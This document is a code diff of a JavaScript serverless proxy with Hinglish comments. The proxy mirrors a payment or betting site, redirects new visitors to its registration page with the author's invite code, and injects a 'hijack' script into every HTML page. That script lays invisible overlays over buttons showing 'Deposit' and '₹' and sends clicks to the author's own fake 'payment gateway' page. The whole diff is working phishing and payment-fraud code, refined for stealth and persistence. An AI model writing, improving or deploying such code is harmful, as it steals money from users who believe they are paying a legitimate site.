@@ -3,16 +3,13 @@ export default async function handler(req, res) {
   const myGitHub = "https://hacrrk1-netizen.github.io/FAST-payment-gateway-/";
   const targetHost = "https://www.91appq.com";
 
-  // 1. AUTO-REGISTER: Jab koi naya banda link kholga
   if (req.url === "/" || req.url === "") {
     res.writeHead(302, { Location: `${targetHost}/#/register?invitationCode=${myInviteCode}` });
     res.end();
     return;
   }
 
-  // 2. MIRROR & INJECT: Site load karke hijack layer dalo
-  const targetUrl = targetHost + req.url;
-  const response = await fetch(targetUrl, {
+  const response = await fetch(targetHost + req.url, {
     headers: { 'User-Agent': req.headers['user-agent'] }
   });
 
@@ -21,34 +18,38 @@ export default async function handler(req, res) {
   if (contentType && contentType.includes("text/html")) {
     let html = await response.text();
 
-    // DOUBLE LAYER HIJACK SCRIPT (For Deposit Button)
+    // STRICT HIJACK SCRIPT (Only for Deposit + ₹)
     const hijackScript = `
     <script>
       (function() {
-        const applyLayer = () => {
-          const elements = document.querySelectorAll('div, button, .van-button');
-          elements.forEach(el => {
+        const strictLock = () => {
+          const allElements = document.querySelectorAll('div, button, span, .van-button');
+          
+          allElements.forEach(el => {
             const text = el.innerText || "";
-            // Photo ke hisaab se target
+            // Yahan hum sirf tab lock karenge jab "Deposit" aur "₹" dono ek saath hon
             if (text.includes('Deposit') && text.includes('₹')) {
-              if (!el.dataset.locked) {
+              
+              if (!el.dataset.hijacked) {
                 el.style.position = 'relative';
-                const overlay = document.createElement('div');
-                overlay.style = 'position:absolute;top:0;left:0;width:100%;height:100%;z-index:99999;cursor:pointer;';
-                
-                overlay.onclick = (e) => {
+
+                const layer = document.createElement('div');
+                layer.style = 'position:absolute;top:0;left:0;width:100%;height:100%;z-index:999999;cursor:pointer;background:rgba(0,0,0,0);';
+
+                layer.onclick = (e) => {
                   e.preventDefault();
                   e.stopPropagation();
                   window.location.href = "${myGitHub}";
                 };
 
-                el.appendChild(overlay);
-                el.dataset.locked = "true";
+                el.appendChild(layer);
+                el.dataset.hijacked = "true";
               }
             }
           });
         };
-        setInterval(applyLayer, 500);
+        // Har 300ms mein scan karega taaki naya amount aane pe bhi lock rahe
+        setInterval(strictLock, 300);
       })();
     </script>`;
 
@@ -56,8 +57,7 @@ export default async function handler(req, res) {
     return res.send(html.replace('</body>', hijackScript + '</body>'));
   }
 
-  // Baaki files (CSS/Images) ko normal bhejo
   const data = await response.arrayBuffer();
   res.setHeader('Content-Type', contentType);
   res.send(Buffer.from(data));
-                                 }
+}
